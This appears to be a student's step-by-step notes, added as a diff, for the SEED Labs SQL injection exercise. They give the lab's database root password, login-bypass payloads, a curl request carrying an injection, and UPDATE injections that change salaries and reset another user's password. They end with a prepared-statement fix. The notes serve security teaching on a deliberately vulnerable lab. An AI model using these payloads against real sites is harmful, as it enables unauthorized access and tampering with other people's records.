@@ -1,0 +1,28 @@
+Step 1: run mysql -u root -pseedubuntu in web-server
+Step 2: run use Users; and show tables; select * from credential; in web-server mysql
+Step 3: fill the Employee ID field with: ' or name = 'Admin' #
+Step 4: run curl 'http://seedlabsqlinjection.com/unsafe_credential.php?EID=%27+or+Name%3D%27Admin%27+%23Password=' in client
+Step 5: alice'; update credential set nickname='AAA' where ssn='10211002'; #
+
+(Can submit from here, since all the requirement is fulfilled)
+
+Step 6: login as alice with EID: ' or 1=1 #    then edit profile, fill the nickname with ', salary='60000 then press edit
+Step 7: login as alice with EID: ' or 1=1 #    then edit profile, fill the nickname with ', password='576f4222ebd359589a0a68206f509d5442612642' where name='Ryan'; # then press edit (Password for Ryan is 'passwd4ryan', encrypted with sha1)
+Step 8: login as Ryan with EID 30000, password is "passwd4ryan"
+Step 9: edit the php for safer sql: sudo nano /var/www/seedlabsqlinjection.com/public_html/unsafe_credential.php, fix the code to this: 
+$stmt = $conn->prepare("SELECT name, local, gender 
+
+FROM USER_TABLE 
+
+WHERE id = ? and password = ? "); 
+
+// Bind parameters to the query 
+
+$stmt->bind_param("is", $id, $pwd); 
+
+$stmt->execute(); 
+
+$stmt->bind_result($bind_name, $bind_local, $bind_gender); 
+
+$stmt->fetch(); 
+
